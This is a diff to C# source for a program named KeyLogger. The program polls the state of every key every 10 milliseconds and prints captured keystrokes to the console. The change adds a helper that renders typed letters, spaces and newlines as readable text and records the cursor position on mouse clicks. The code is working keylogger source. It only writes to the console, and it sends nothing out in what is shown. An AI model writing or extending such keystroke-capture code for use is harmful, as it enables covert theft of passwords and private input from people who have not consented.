@@ -42,11 +42,39 @@ namespace KeyLogger
                 foreach (var key in (Keys[])Enum.GetValues(typeof(Keys)))
                 {
                     if (GetAsyncKeyState(key) != -32767) continue;
-                    Console.Write($"[{Enum.GetName(typeof(Keys), key)}]");
+                    Console.Write(GetKeyName(key));
                 }
             }, null, TimeSpan.Zero, TimeSpan.FromMilliseconds(10));
             
             Console.ReadKey();
+        }
+
+        /// <summary>
+        /// Obtem o nome ou descrição de uma tecla.
+        /// </summary>
+        /// <param name="key">Tecla.</param>
+        /// <returns>Nome ou descrição.</returns>
+        private static string GetKeyName(Keys key)
+        {
+            switch (key)
+            {
+                case Keys.Space: return " ";
+                case Keys.Enter: return "\n";
+                default:
+                {
+                    var name = $"{Enum.GetName(typeof(Keys), key)}";
+                    
+                    if (name.Length == 1) return name.ToLower();
+
+                    if (name.Contains("Button"))
+                    {
+                        GetCursorPos(out var mouse);
+                        return $"[{name} X:{mouse.X} Y:{mouse.Y}]";
+                    }
+
+                    return $"[{name}]";
+                }
+            }
         } 
     }
 }
